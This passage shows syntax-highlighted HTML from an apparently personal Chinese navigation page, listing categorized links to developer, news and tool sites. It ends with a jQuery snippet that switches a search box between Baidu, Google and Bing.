                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://blog.51cto.com/<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>link-3<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>51CTO<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>
                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://www.shiyanlou.com/library/<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>link-3<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>实验楼<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>
                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://spring.io/<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>link-3<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Spring<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>
                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>col s12 m6 l4 friend-div<span class="token punctuation">"</span></span> <span class="token attr-name">data-aos</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>zoom-in-up<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>card<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>jj-list-tit<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>资讯 · 趋势<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>jj-list-con<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://www.huxiu.com/<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>link-3<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>虎嗅<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>
                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://insights.stackoverflow.com/<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>link-3<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>技术调查<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>
                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.asciiworld.com/<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>link-3<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>摸鱼<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>
                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://sspai.com/<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>link-3<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>少数派<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>
                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://zh.wikihow.com/<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>link-3<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>WikeHom<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>
                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://www.awesomes.cn/rank?sort<span class="token punctuation">=</span>hot<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>link-3<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>前端趋势<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>
                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://github-trending.com/<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>link-3<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>GitHub趋势<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>
                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://www.tiobe.com/<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>link-3<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>编程趋势<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>
                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://trends.google.com/<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>link-3<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Google趋势<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>
                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>col s12 m6 l4 friend-div<span class="token punctuation">"</span></span> <span class="token attr-name">data-aos</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>zoom-in-up<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>card<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>jj-list-tit<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>搜索 · 其他<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>jj-list-con<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.pansoso.com/<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>link-3<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>网盘搜索<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>
                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://tool.mkblog.cn/music/<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>link-3<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>音乐搜索<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>
                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://www.dytt8.net/<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>link-3<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>电影天堂<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>
                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://carbon.now.sh/<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>link-3<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>代码图片<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>
                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://www.zhipin.com/<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>link-3<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Boos<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>
                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://fontawesome.com/<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>link-3<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>图标库<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>
                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://www.qvdv.com/tools/qvdv-guid.html<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>link-3<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>在线工具<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>
                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://zhongguose.com/<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>link-3<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>中国色<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>
                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://opensource.builders/<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>link-3<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>OpenSource<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>
                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript"> <span class="token comment" spellcheck="true">/*选择搜索引擎*/</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'.Select-box ul'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">hover</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">css</span><span class="token punctuation">(</span><span class="token string">'height'</span><span class="token punctuation">,</span> <span class="token string">'auto'</span><span class="token punctuation">)</span> <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">css</span><span class="token punctuation">(</span><span class="token string">'height'</span><span class="token punctuation">,</span> <span class="token string">'40px'</span><span class="token punctuation">)</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'.Select-box-2 ul'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">hover</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">css</span><span class="token punctuation">(</span><span class="token string">'height'</span><span class="token punctuation">,</span> <span class="token string">'auto'</span><span class="token punctuation">)</span> <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">css</span><span class="token punctuation">(</span><span class="token string">'height'</span><span class="token punctuation">,</span> <span class="token string">'46px'</span><span class="token punctuation">)</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'.Select-box li'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">click</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token keyword">var</span> _tihs <span class="token operator">=</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">attr</span><span class="token punctuation">(</span><span class="token string">'class'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">var</span> _html <span class="token operator">=</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">html</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>_tihs <span class="token operator">==</span> <span class="token string">'baidu_s'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> _tihs <span class="token operator">=</span> <span class="token string">'https://www.baidu.com/s'</span><span class="token punctuation">;</span> _name <span class="token operator">=</span> <span class="token string">'wd'</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>_tihs <span class="token operator">==</span> <span class="token string">'google_s'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> _tihs <span class="token operator">=</span> <span class="token string">'https://www.google.com/search'</span><span class="token punctuation">;</span> _name <span class="token operator">=</span> <span class="token string">'q'</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>_tihs <span class="token operator">==</span> <span class="token string">'bing_s'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> _tihs <span class="token operator">=</span> <span class="token string">'https://www.bing.com/search'</span><span class="token punctuation">;</span> _name <span class="token operator">=</span> <span class="token string">'q'</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'.baidu form'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">attr</span><span class="token punctuation">(</span><span class="token string">'action'</span><span class="token punctuation">,</span> _tihs<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'.this_s'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">html</span><span class="token punctuation">(</span>_html<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#kw'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">attr</span><span class="token punctuation">(</span><span class="token string">'name'</span><span class="token punctuation">,</span> _name<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'.Select-box ul'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">css</span><span class="token punctuation">(</span><span class="token string">'height'</span><span class="token punctuation">,</span> <span class="token string">'40px'</span><span class="token punctuation">)</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'.Select-box-2 li'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">click</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token keyword">var</span> _tihs <span class="token operator">=</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">attr</span><span class="token punctuation">(</span><span class="token string">'class'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">var</span> _html <span class="token operator">=</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">html</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>_tihs <span class="token operator">==</span> <span class="token string">'baidu_s'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> _tihs <span class="token operator">=</span> <span class="token string">'https://www.baidu.com/s'</span><span class="token punctuation">;</span> _name <span class="token operator">=</span> <span class="token string">'wd'</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>_tihs <span class="token operator">==</span> <span class="token string">'google_s'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> _tihs <span class="token operator">=</span> <span class="token string">'https://www.google.com/search'</span><span class="token punctuation">;</span> _name <span class="token operator">=</span> <span class="token string">'q'</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>_tihs <span class="token operator">==</span> <span class="token string">'bing_s'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> _tihs <span class="token operator">=</span> <span class="token string">'https://www.bing.com/search'</span><span class="token punctuation">;</span> _name <span class="token operator">=</span> <span class="token string">'q'</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'.baidu form'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">attr</span><span class="token punctuation">(</span><span class="token string">'action'</span><span class="token punctuation">,</span> _tihs<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'.this_s'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">html</span><span class="token punctuation">(</span>_html<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#kw-2'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">attr</span><span class="token punctuation">(</span><span class="token string">'name'</span><span class="token punctuation">,</span> _name<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token 